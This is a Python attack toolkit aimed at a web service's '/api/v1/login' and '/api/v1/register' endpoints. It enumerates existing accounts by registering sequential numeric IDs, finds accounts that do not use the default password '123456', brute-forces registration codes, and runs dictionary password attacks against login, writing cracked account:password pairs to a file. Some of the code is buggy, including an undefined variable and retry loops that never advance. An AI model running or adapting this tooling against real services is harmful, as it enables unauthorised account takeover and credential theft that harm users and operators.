import requests
import time
import os

class EAW_ToolKit:
    
    def __init__(self, host):
        self.host = host
        self.defaultPassword = '123456'
        self.passwordList = []
    
    def _login(self, account, password):
        path='/api/v1/login'
        gzip='gzip'
        lang='ZH'
        try:
            res = requests.post(self.host+path,data={
                'account': account,
                'password': password,
                'gzip': gzip,
                'lang': lang
            })
        except Exception as e:
            time.sleep(1)
            print ('Exception occurs , retry after 1s:' + str(e))
            return self._login(account, password)
        # print ('Login returns:', res.content)
        return res

    def _register(self, account, password, code=''):
        path='/api/v1/register'

        gzip='gzip'
        lang='ZH'
        try:
            res = requests.post(self.host+path, data={
                'account': account,
                'password': password,
                'gzip': gzip,
                'lang': lang,
                'code': code
            })
        except Exception as e:
            time.sleep(1)
            print ('Exception occurs , retry after 1s:' + str(e))
            return self._register(account, password, code)
        return res
        
    # Find account whose password is not 123456
    def findTargetAccount(self):
        defaultPassword='123456'
        existingFile = open('existing.txt','r')
        targetAccountsFile= open('target.txt', 'a')
        accountLines=existingFile.readlines()
        print (accountLines)
        for line in accountLines:
            account = line.strip()
            response=self._login(account, defaultPassword)
            contentJson=response.json()
            print ('Login response:' + account, contentJson['code'])
            print (contentJson['message'])
            if contentJson['code'] == 0:
                print ('Login default password succeeded for '+ account)
            else:
                print ('Saving account whose password is not default:'+ account)
                targetAccountsFile.write(account)
                targetAccountsFile.write('\n')


    def bruteRegister(self, account, codeBegin, codeEnd):
        code = int(codeBegin)
        maxCode= int(codeEnd)
        validCodeFile = open('valid-code.txt', 'a')
        validCode = []
        while code < maxCode:
            print ('Registering account:'+ account, code)
            response = self._register(account, self.defaultPassword, code)
            try:
                contentJson = response.json()
            except ValueError:
                print ('Failed to pass JSON:'+ account+':'+self.defaultPassword, response.content)
                continue
            try:
                print (contentJson['code'])
                print (contentJson['message'])
            except KeyError:
                print ('Failed to pass JSON key:'+ account+':'+self.defaultPassword, response.content)
                continue
            if contentJson['code'] == 0:
                print ('Register account succeeded:' + account)
                print ('Save valid code:'+ code)
                validCode.append(code)
                validCodeFile.write(code)
                validCodeFile.write('\n')

            code +=1
        if len(validCode) == 0:
            print ("No valid code found between", codeBegin, codeEnd)
        else:
            print ("Found valid code:", validCode)


    # register from 0 - 9999
    def registerRange(self, begin, end):
        init_number=int(begin)
        maximum=int(end)
        existing_account=[]
        existing_file=open('existing.txt','a')
        while init_number < maximum:
            account=str(init_number)
            print ('Registering account:'+ account)

            response = self._register(account, self.defaultPassword)
            try:
                contentJson = response.json()
            except ValueError:
                print ('Failed to pass JSON:'+ account+':'+self.defaultPassword, response.content)
                continue
            try:
                print (contentJson['code'])
                print (contentJson['message'])
            except KeyError:
                print ('Failed to pass JSON key:'+ account+':'+self.defaultPassword, response.content)
                continue
            if contentJson['code'] == 0:
                print ('Register account succeeded:' + account)
            else: 
                print ('Save existing account:' + account)
                existing_account.append(account)
                existing_file.write(account)
                existing_file.write("\n")
            # time.sleep(0.1)
            init_number += 1

    def readOrCreatePassList(self):
        DICT_PATH='./password_dict'
        if os.path.isfile(os.path.join(DICT_PATH, 'distinct-pwd.txt')):
            distinctPwdFile=open(os.path.join(DICT_PATH, 'distinct-pwd.txt'),  "r", encoding='utf8')
            numOfLines = num_lines = sum(1 for line in distinctPwdFile)
            if numOfLines > 0:
                print ('readlines', numOfLines)
                distinctPwdFile.seek(0)
                for line in distinctPwdFile.readlines():
                    pwd = line.strip()
                    self.passwordList.append(pwd)
                print ('1. Collected common passwords:', len(self.passwordList))
                return
            distinctPwdFile.close()
        # distinct-pwd.txt doesn't exist or is empty
        distinctPwdFile=open(os.path.join(DICT_PATH, 'distinct-pwd.txt'),  "w", encoding="utf-8")
        for filename in os.listdir(DICT_PATH):
            print ('Read passwords from', filename)
            dict_file=open(os.path.join(DICT_PATH, filename), 'r', encoding='utf8', errors='ignore')
            for line in dict_file.readlines():
                pwd = line.strip()
                if len(pwd) >=6:
                    if pwd in self.passwordList:
                        pass
                    else:
                        self.passwordList.append(pwd)
                        distinctPwdFile.write(str(pwd))
                        distinctPwdFile.write('\n')
        print ('2. Collected common passwords:', len(self.passwordList))

    # brute force try password 6 digits password 100000 - 999999
    def bruteForceLogin(self, account, beginIdx=-1, endIdx=-1):
        if beginIdx == -1 or endIdx == -1:
           begin = 0
           end = len(self.passwordList)+1
        else:
            begin= beginIndex
            end = endIdx
        targetPwdFile= open('target-pwd.txt', 'a')
        
        for pwd in self.passwordList[begin:end]:
            password = str(pwd)
            response = self._login(account, password)
            try:
                contentJson = response.json()
            except ValueError:
                print ('Failed to pass JSON:'+ account+':'+password, response.content)
                continue
            try:
                print ('Login response:' + account+':'+password, contentJson['code'])
                print (contentJson['message'])
            except KeyError:
                print ('Failed to pass JSON key:'+ account+':'+password, response.content)
                continue
            if contentJson['code'] == 0 :
                print ('Password found:'+ password)
                targetPwdFile.write(account+':'+password)
                targetPwdFile.write('\n')
                return
            
        print ('No password found')


    